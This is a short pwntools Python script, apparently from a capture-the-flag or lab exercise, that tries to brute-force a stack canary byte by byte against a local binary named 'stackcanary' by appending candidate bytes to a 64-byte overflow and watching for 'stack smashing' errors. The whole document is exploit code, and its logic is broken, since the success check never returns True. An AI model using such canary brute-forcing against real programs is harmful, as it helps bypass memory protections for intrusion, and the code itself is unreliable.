from pwn import *

context.update(os = "linux", arch = "i386")

buffer = b"A"*64
payload = buffer

def exploit(payload):
	try:
		p = process(["./stackcanary", payload])
		if(p.readline().decode().find("stack smashing")!=-1):#==-1 la k co, !=-1 la co => sai
			p.close()
			return False
	except EOFError:
		print("ERROR")
		return False
	finally:
		p.close()
def leak_bytes(payload):
	# for i in range(8):
		for k in range(256):
			if(exploit(payload+p8(k))==True):
				print(k)
				payload+=p8(k)
				break




leak_bytes(payload)


	
